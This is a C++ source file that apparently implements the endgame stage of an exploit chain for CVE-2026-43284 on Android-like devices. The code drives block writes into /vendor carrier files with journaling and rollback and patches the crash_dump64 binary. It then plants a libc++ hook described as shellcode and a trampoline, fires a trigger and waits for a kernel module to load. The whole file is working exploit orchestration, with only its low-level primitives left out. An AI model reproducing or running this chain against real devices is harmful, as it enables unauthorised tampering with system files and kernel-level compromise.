/* CVE-2026-43284 endgame chain implementation (B5-6, host part).
 *
 * See chain.hpp for the ordering, the injected surface and the terminus. This
 * translation unit contains no syscall, no fork/exec and no direct file write:
 * the device bindings (crash_dump bridge, page-cache socket, sentry trigger and
 * fd/secret release) are supplied by ChainOps and land in B5-9. */

#include "backend/cve_2026_43284/steps/chain.hpp"

#include <limits>

namespace ghostlock::backend::cve_2026_43284::steps {

    namespace {
        /* Structural constraints shared by the production and the dev-only
         * carrier check: absolute, shorter than the 64-byte shellcode buffer
         * and free of whitespace/control separators. The /vendor prefix policy
         * is applied only by valid_carrier_path(). */
        [[nodiscard]] bool valid_carrier_shape(std::string_view path) noexcept {
            if (path.empty() || path.size() >= kCarrierPathMaxBytes) {
                return false;
            }
            if (path[0] != '/') {
                return false;
            }
            for (const char c : path) {
                if (c == ' ' || c == '\t' || c == '\n' || c == '\r') {
                    return false;
                }
            }
            return true;
        }
    } // namespace

    bool valid_carrier_path(std::string_view path) noexcept {
        if (!valid_carrier_shape(path)) {
            return false;
        }
        const bool under_vendor = path.substr(0U, 8U) == "/vendor/";
        const bool under_system_vendor = path.substr(0U, 15U) == "/system/vendor/";
        return under_vendor || under_system_vendor;
    }

    bool valid_dev_carrier_path(std::string_view path) noexcept {
        return valid_carrier_shape(path);
    }

    bool CarrierList::add(const CarrierTarget &target) noexcept {
        if (!valid_carrier_path(target.path)) {
            return false;
        }
        for (std::size_t i = 0U; i < count; ++i) {
            if (items[i].path == target.path) {
                return true;
            }
        }
        if (count >= items.size()) {
            return false;
        }
        items[count] = target;
        ++count;
        return true;
    }

    bool build_carrier_list(const CarrierTarget *primary, std::size_t primary_count,
                            CarrierList &out) noexcept {
        out = CarrierList{};
        if (primary != nullptr) {
            for (std::size_t i = 0U; i < primary_count; ++i) {
                (void)out.add(primary[i]);
            }
        }
        for (const CarrierTarget &fallback : kDefaultCarriers) {
            (void)out.add(fallback);
        }
        return out.count > 0U;
    }

} // namespace ghostlock::backend::cve_2026_43284::steps

namespace {

    using ghostlock::backend::cve_2026_43284::steps::CarrierTarget;
    using ghostlock::backend::cve_2026_43284::steps::ChainError;
    using ghostlock::backend::cve_2026_43284::steps::ChainOps;
    using ghostlock::backend::cve_2026_43284::steps::ChainRequest;
    using ghostlock::backend::cve_2026_43284::steps::ChainResult;
    using ghostlock::backend::cve_2026_43284::steps::ChainStage;
    using ghostlock::backend::cve_2026_43284::steps::ChainWaitOutcome;
    using ghostlock::backend::cve_2026_43284::steps::ChainWorkspace;
    using ghostlock::backend::cve_2026_43284::steps::kChainBlockBytes;
    using ghostlock::backend::cve_2026_43284::steps::PatchPlan;
    using ghostlock::backend::cve_2026_43284::steps::PatchRegion;
    using ghostlock::backend::cve_2026_43284::steps::valid_carrier_path;
    using ghostlock::backend::cve_2026_43284::steps::valid_dev_carrier_path;

    /* Applies the production /vendor prefix constraint unless the explicit dev
     * staged-run escape hatch is set on the request. */
    [[nodiscard]] bool carrier_path_allowed(std::string_view path,
                                            bool allow_dev) noexcept {
        return allow_dev ? valid_dev_carrier_path(path)
                         : valid_carrier_path(path);
    }

    /* Non-elidable wipe for the journal and any secret handed to release. */
    void secure_wipe(void *data, std::size_t len) noexcept {
        auto *bytes = static_cast<volatile std::uint8_t *>(data);
        for (std::size_t i = 0U; i < len; ++i) {
            bytes[i] = 0U;
        }
    }

    bool bytes_equal(const std::uint8_t *lhs, const std::uint8_t *rhs,
                     std::size_t len) noexcept {
        std::uint8_t diff = 0U;
        for (std::size_t i = 0U; i < len; ++i) {
            diff = static_cast<std::uint8_t>(
                    diff | static_cast<std::uint8_t>(lhs[i] ^ rhs[i]));
        }
        return diff == 0U;
    }

    void record_attempt(ChainWorkspace &workspace,
                        const ChainWorkspace::CarrierAttempt &attempt) noexcept {
        if (workspace.carrier_attempt_count < workspace.carrier_attempts.size()) {
            workspace.carrier_attempts[workspace.carrier_attempt_count] = attempt;
            ++workspace.carrier_attempt_count;
        }
    }

    void clear_journal(ChainWorkspace &workspace) noexcept {
        workspace.journal_count = 0U;
        secure_wipe(workspace.journal.data(), sizeof(workspace.journal));
    }

    /* Best-effort restore of everything written since the journal was last
     * reset, newest first, then scrub the journal. */
    void rollback_journal(const ChainOps &ops, ChainWorkspace &workspace,
                          ChainResult &result) noexcept {
        std::uint32_t rolled = 0U;
        for (std::size_t i = workspace.journal_count; i > 0U; --i) {
            const ChainWorkspace::JournalEntry &entry = workspace.journal[i - 1U];
            const std::int32_t written = ops.write.write16(ops.write.ctx, entry.offset,
                                                           entry.bytes.data());
            if (written == 0) {
                ++rolled;
            } else {
                workspace.rollback_incomplete = true;
            }
        }
        result.blocks_rolled_back = rolled;
        clear_journal(workspace);
    }

    enum class ApplyOutcome : std::uint8_t {
        Ok = 0U,
        CarrierUnusable,
        Failed,
    };

    ApplyOutcome apply_plan(const PatchPlan &plan, const CarrierTarget &carrier,
                            std::uint64_t target_size, const ChainOps &ops,
                            ChainWorkspace &workspace, ChainResult &result) noexcept {
        /* Region closure is checked before a single byte is written: the plan's
         * declared extent, the carrier's declared size, the target file size
         * and mutual overlap. */
        const ChainError closure =
                validate_plan_closure(plan, carrier.size, target_size);
        if (closure != ChainError::None) {
            result.error = closure;
            return ApplyOutcome::Failed;
        }

        std::uint32_t wrote_here = 0U;
        for (std::size_t ri = 0U; ri < plan.region_count; ++ri) {
            const PatchRegion &region = plan.regions[ri];
            if ((region.rollback || region.verify) && !ops.read_ready()) {
                result.error = ChainError::NotAvailable;
                return ApplyOutcome::Failed;
            }

            /* Optional pre-image assert: check the whole region against the
             * caller-supplied original before writing any of it. A mismatch is
             * final (no carrier fallback -- the declared file is the wrong or a
             * changed one); a read failure before any write is reported as an
             * unusable carrier, exactly like the journal read below. */
            if (region.preimage != nullptr) {
                const std::size_t preimage_blocks = region.len / kChainBlockBytes;
                for (std::size_t b = 0U; b < preimage_blocks; ++b) {
                    const std::uint64_t offset =
                            region.offset +
                            static_cast<std::uint64_t>(b) * kChainBlockBytes;
                    std::array<std::uint8_t, kChainBlockBytes> old{};
                    const long got =
                            ops.read_block(ops.write.ctx, offset, old.data());
                    if (got != static_cast<long>(kChainBlockBytes)) {
                        if (wrote_here == 0U) {
                            return ApplyOutcome::CarrierUnusable;
                        }
                        result.error = ChainError::ReadFailed;
                        rollback_journal(ops, workspace, result);
                        return ApplyOutcome::Failed;
                    }
                    if (!bytes_equal(old.data(),
                                     region.preimage + b * kChainBlockBytes,
                                     kChainBlockBytes)) {
                        result.error = ChainError::PreImageMismatch;
                        rollback_journal(ops, workspace, result);
                        return ApplyOutcome::Failed;
                    }
                }
                result.preimage_checked = true;
            }

            const std::size_t block_count = region.len / kChainBlockBytes;
            for (std::size_t b = 0U; b < block_count; ++b) {
                const std::uint64_t offset =
                        region.offset + static_cast<std::uint64_t>(b) * kChainBlockBytes;
                const std::uint8_t *desired = region.bytes + b * kChainBlockBytes;

                if (region.rollback) {
                    result.last_stage = ChainStage::Write;
                    std::array<std::uint8_t, kChainBlockBytes> old{};
                    const long got = ops.read_block(ops.write.ctx, offset, old.data());
                    if (got != static_cast<long>(kChainBlockBytes)) {
                        if (wrote_here == 0U) {
                            return ApplyOutcome::CarrierUnusable;
                        }
                        result.error = ChainError::ReadFailed;
                        rollback_journal(ops, workspace, result);
                        return ApplyOutcome::Failed;
                    }
                    if (workspace.journal_count < workspace.journal.size()) {
                        workspace.journal[workspace.journal_count].offset = offset;
                        workspace.journal[workspace.journal_count].bytes = old;
                        ++workspace.journal_count;
                    } else {
                        workspace.journal_overflow = true;
                    }
                }

                result.last_stage = ChainStage::Write;
                const std::int32_t written = ops.write.write16(ops.write.ctx, offset, desired);
                if (written != 0) {
                    result.error = ChainError::WriteFailed;
                    rollback_journal(ops, workspace, result);
                    return ApplyOutcome::Failed;
                }
                ++result.blocks_written;
                ++wrote_here;

                if (region.verify) {
                    result.last_stage = ChainStage::Verify;
                    std::array<std::uint8_t, kChainBlockBytes> back{};
                    const long got = ops.read_block(ops.write.ctx, offset, back.data());
                    if (got != static_cast<long>(kChainBlockBytes)) {
                        result.error = ChainError::ReadFailed;
                        rollback_journal(ops, workspace, result);
                        return ApplyOutcome::Failed;
                    }
                    if (!bytes_equal(back.data(), desired, kChainBlockBytes)) {
                        result.error = ChainError::VerifyMismatch;
                        rollback_journal(ops, workspace, result);
                        return ApplyOutcome::Failed;
                    }
                    ++result.blocks_verified;
                }
            }
        }
        return ApplyOutcome::Ok;
    }

    /* The single terminus: release runs exactly once, then the journal is
     * scrubbed. A run that never bound release cannot claim a clean terminus. */
    ChainResult finish(ChainResult result, const ChainOps &ops, ChainWorkspace &workspace) noexcept {
        result.last_stage = ChainStage::Cleanup;
        result.journal_overflow = workspace.journal_overflow;
        result.rollback_incomplete = workspace.rollback_incomplete;
        /* Unconditional hook restore, before release closes the write surface.
         * It runs on every terminus path (success, failure, early exit); the
         * callback itself is a no-op when no hook was applied. */
        if (ops.restore_hook != nullptr) {
            result.hook_restored = ops.restore_hook(ops.write.ctx);
        }
        if (ops.release != nullptr) {
            ops.release(ops.write.ctx);
            result.cleanup_ran = true;
        } else if (result.error == ChainError::None) {
            result.error = ChainError::CleanupFailed;
        }
        clear_journal(workspace);
        return result;
    }

} // namespace

namespace ghostlock::backend::cve_2026_43284::steps {

    ChainError validate_plan_closure(const PatchPlan &plan,
                                     std::uint64_t declared_extent,
                                     std::uint64_t target_size) noexcept {
        if (plan.regions == nullptr || plan.region_count == 0U) {
            return ChainError::InvalidPlan;
        }
        for (std::size_t i = 0U; i < plan.region_count; ++i) {
            const PatchRegion &region = plan.regions[i];
            if (region.bytes == nullptr || region.len == 0U ||
                (region.len % kChainBlockBytes) != 0U) {
                return ChainError::InvalidPlan;
            }
            if (region.offset >
                std::numeric_limits<std::uint64_t>::max() - region.len) {
                return ChainError::InvalidPlan;
            }
            const std::uint64_t end =
                    region.offset + static_cast<std::uint64_t>(region.len);
            if (plan.extent != 0U && end > plan.extent) {
                return ChainError::InvalidPlan;
            }
            if (declared_extent != 0U && end > declared_extent) {
                return ChainError::InvalidPlan;
            }
            if (target_size != 0U && end > target_size) {
                return ChainError::TargetOutOfBounds;
            }
        }
        /* Regions are not required to be sorted, so check every pair. A plan in
         * practice holds one module region; the O(n^2) walk keeps the unit
         * allocation-free like the rest of the chain. */
        for (std::size_t i = 0U; i < plan.region_count; ++i) {
            const std::uint64_t i_begin = plan.regions[i].offset;
            const std::uint64_t i_end =
                    i_begin + static_cast<std::uint64_t>(plan.regions[i].len);
            for (std::size_t j = i + 1U; j < plan.region_count; ++j) {
                const std::uint64_t j_begin = plan.regions[j].offset;
                const std::uint64_t j_end =
                        j_begin + static_cast<std::uint64_t>(plan.regions[j].len);
                if (i_begin < j_end && j_begin < i_end) {
                    return ChainError::InvalidPlan;
                }
            }
        }
        return ChainError::None;
    }

    ChainResult run_chain(const ChainRequest &request, const ChainOps &ops,
                          ChainWorkspace &workspace) noexcept {
        ChainResult result{};
        workspace = ChainWorkspace{};

        if (!ops.write_ready()) {
            result.last_stage = ChainStage::Write;
            result.error = ChainError::NotAvailable;
            return finish(result, ops, workspace);
        }

        result.last_stage = ChainStage::ResolveTarget;
        bool any_valid = false;
        if (request.carriers != nullptr) {
            for (std::size_t i = 0U; i < request.carrier_count; ++i) {
                if (carrier_path_allowed(request.carriers[i].path,
                                         request.allow_dev_carrier_path)) {
                    any_valid = true;
                    break;
                }
            }
        }
        if (request.carriers == nullptr || request.carrier_count == 0U || !any_valid) {
            if (request.carriers != nullptr) {
                for (std::size_t i = 0U; i < request.carrier_count; ++i) {
                    ChainWorkspace::CarrierAttempt attempt{};
                    attempt.path = request.carriers[i].path;
                    attempt.error = ChainError::CarrierUnusable;
                    record_attempt(workspace, attempt);
                }
            }
            result.error = ChainError::NoCarrier;
            return finish(result, ops, workspace);
        }

        result.last_stage = ChainStage::ComputePlan;
        PatchPlan plan = request.plan;
        if (ops.build_plan != nullptr) {
            ChainError plan_error = ChainError::None;
            if (!ops.build_plan(ops.write.ctx, plan, plan_error)) {
                result.error =
                        plan_error == ChainError::None ? ChainError::InvalidPlan : plan_error;
                return finish(result, ops, workspace);
            }
        }
        /* Plan closure is carrier-independent up to the carrier's own declared
         * size, so check it here -- before patch #1 and before any write -- and
         * again per carrier inside apply_plan(). */
        const ChainError closure = validate_plan_closure(plan, 0U, request.target_size);
        if (closure != ChainError::None) {
            result.error = closure;
            return finish(result, ops, workspace);
        }

        /* patch #1 runs before the carrier write: the vendor read bridge execs
         * the already-patched crash_dump64. The dev-only staged escape hatch
         * must not touch system files, so it is skipped there. */
        if (ops.patch_crash_dump != nullptr && !request.allow_dev_carrier_path) {
            result.last_stage = ChainStage::PatchCrashDump;
            const ChainError crash_error = ops.patch_crash_dump(ops.write.ctx);
            if (crash_error != ChainError::None) {
                result.error = crash_error;
                return finish(result, ops, workspace);
            }
            result.crash_dump_patched = true;
        }

        for (std::size_t i = 0U; i < request.carrier_count; ++i) {
            const CarrierTarget &candidate = request.carriers[i];
            ChainWorkspace::CarrierAttempt attempt{};
            attempt.path = candidate.path;
            if (!carrier_path_allowed(candidate.path,
                                      request.allow_dev_carrier_path)) {
                attempt.error = ChainError::CarrierUnusable;
                record_attempt(workspace, attempt);
                continue;
            }

            const std::uint32_t before = result.blocks_written;
            result.carrier = &candidate;
            const ApplyOutcome outcome =
                    apply_plan(plan, candidate, request.target_size, ops, workspace,
                               result);
            attempt.blocks_written = result.blocks_written - before;

            if (outcome == ApplyOutcome::Ok) {
                record_attempt(workspace, attempt);
                break;
            }
            result.carrier = nullptr;
            if (outcome == ApplyOutcome::CarrierUnusable) {
                attempt.error = ChainError::CarrierUnusable;
                record_attempt(workspace, attempt);
                clear_journal(workspace);
                continue;
            }
            attempt.error = result.error;
            record_attempt(workspace, attempt);
            return finish(result, ops, workspace);
        }

        if (result.carrier == nullptr) {
            result.error = ChainError::NoCarrier;
            return finish(result, ops, workspace);
        }

        /* Staged write-only run: stop after every planned block was written and
         * verified, before any trigger fires. The terminus (release + journal
         * scrub) still runs exactly once. */
        if (request.stop_after == ChainStopAfter::Write) {
            return finish(result, ops, workspace);
        }

        /* libc++ sentry hook: locate + shellcode/trampoline + write, after the
         * carrier write/verify and before the trigger (upstream order). */
        if (ops.apply_hook != nullptr) {
            result.last_stage = ChainStage::Hook;
            const ChainError hook_error = ops.apply_hook(ops.write.ctx);
            if (hook_error != ChainError::None) {
                result.error = hook_error;
                return finish(result, ops, workspace);
            }
            result.hook_applied = true;
        }

        result.last_stage = ChainStage::Trigger;
        if (ops.trigger == nullptr || ops.trigger(ops.write.ctx) != 0) {
            result.error = ChainError::TriggerFailed;
            return finish(result, ops, workspace);
        }

        result.last_stage = ChainStage::WaitResult;
        if (ops.wait_result == nullptr) {
            result.error = ChainError::WaitTimeout;
            return finish(result, ops, workspace);
        }
        result.wait = ops.wait_result(ops.write.ctx, request.wait_timeout_ms);
        if (result.wait == ChainWaitOutcome::LkmLoaded) {
            result.lkm_loaded = true;
        } else if (result.wait == ChainWaitOutcome::Failed) {
            result.error = ChainError::LkmFailed;
        } else {
            result.error = ChainError::WaitTimeout;
        }
        return finish(result, ops, workspace);
    }

} // namespace ghostlock::backend::cve_2026_43284::steps
